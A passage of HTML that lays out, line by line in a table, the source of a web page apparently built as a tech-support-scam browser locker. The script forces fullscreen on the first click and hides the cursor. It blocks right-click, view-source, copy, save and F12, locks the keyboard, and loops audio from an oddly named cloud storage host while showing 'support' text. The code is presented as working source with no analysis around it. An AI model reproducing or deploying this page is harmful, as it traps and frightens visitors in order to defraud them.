      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">top: 0;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">left: 50%;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">transform: translateX(-50%);</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">z-index: 9999999999;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">text-align: center;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">#welcomeDiv p {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">color: #FEFEFE;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">margin-top: 10px;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">font-size: 16px;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">opacity: 0.9;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;/style&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;script&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.addEventListener('DOMContentLoaded', function () {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">var isPopupVisible = true;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">var music = document.getElementById('music');</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">var isPlaying = false;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">function toggleMusic() {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">if (isPlaying) {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">music.pause();</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">} else {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">music.play();</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">isPlaying = !isPlaying;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">function playMusicOnClick() {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">toggleMusic();</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.removeEventListener('click', playMusicOnClick);</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">music.addEventListener('click', toggleMusic);</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.addEventListener('click', playMusicOnClick);</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">var fullscreenEnabled = document.fullscreenEnabled || document.mozFullScreenEnabled || document.documentElement.webkitRequestFullScreen;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">if (fullscreenEnabled) {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.documentElement.requestFullscreen = document.documentElement.requestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.webkitRequestFullScreen;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.cancelFullscreen = document.cancelFullscreen || document.mozCancelFullScreen || document.webkitCancelFullScreen;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">var isFullscreen = false;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.addEventListener('click', function () {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">if (!isFullscreen) {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">isFullscreen = true;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.documentElement.requestFullscreen();</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.body.classList.add('fullscreen');</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">showWelcomeDiv();</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">showSupportText();</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">});</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.addEventListener('fullscreenchange', function () {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">isFullscreen = !isFullscreen;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">});</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">var modalOverlay = document.getElementById('modal-overlay');</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">var modalClose = document.getElementById('modal-close');</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">function showModal() {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">modalOverlay.style.display = 'block';</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">function closeModal() {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">modalOverlay.style.display = 'none';</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">modalClose.addEventListener('click', closeModal);</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">showModal();</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">function hideCursor() {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.documentElement.style.cursor = 'none';</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.addEventListener('click', function () {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">hideCursor();</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.removeEventListener('click', hideCursor);</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">if (isPopupVisible) {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">closeModal();</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">isPopupVisible = false;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">});</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">var acceptButton = document.getElementById('modal-accept');</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">var dismissButton = document.getElementById('modal-dismiss');</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">acceptButton.addEventListener('click', closeModal);</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">dismissButton.addEventListener('click', closeModal);</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.addEventListener('contextmenu', function (event) {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">event.preventDefault();</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">});</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.addEventListener('keydown', function (e) {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">if (e.ctrlKey &amp;&amp; (e.keyCode === 'U'.charCodeAt(0) || e.keyCode === 'u'.charCodeAt(0)) ||</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">e.ctrlKey &amp;&amp; (e.keyCode === 'C'.charCodeAt(0) || e.keyCode === 'c'.charCodeAt(0)) ||</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">e.ctrlKey &amp;&amp; (e.keyCode === 'S'.charCodeAt(0) || e.keyCode === 's'.charCodeAt(0))) {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">e.preventDefault();</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">});</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">function preventKeyEvents(event) {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">const blockedKeyCodes = [123];</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">const keyCode = event.keyCode || event.which;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">if (blockedKeyCodes.includes(keyCode)) {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">event.preventDefault();</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">console.log(`Key with code ${keyCode} is blocked.`);</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">window.addEventListener('keydown', preventKeyEvents);</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">});</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">navigator.keyboard.lock();</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">document.onkeydown = function (e) {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">return false;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">function showWelcomeDiv() {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">var welcomeDiv = document.getElementById('welcomeDiv');</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">welcomeDiv.style.display = 'block';</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">function showSupportText() {</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">var supportText = document.getElementById('support-text');</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">supportText.style.display = 'block';</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;/script&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;/head&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;body&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;audio id="music" src="<a href="https://1nvafasqq1.z13.web.core.windows.net/direction2/vm6ujzmhi9.mp3"><span class="s2">vm6ujzmhi9.mp3</span></a>" controls loop&gt;&lt;/audio&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;div id="modal-overlay"&gt;</span></p>
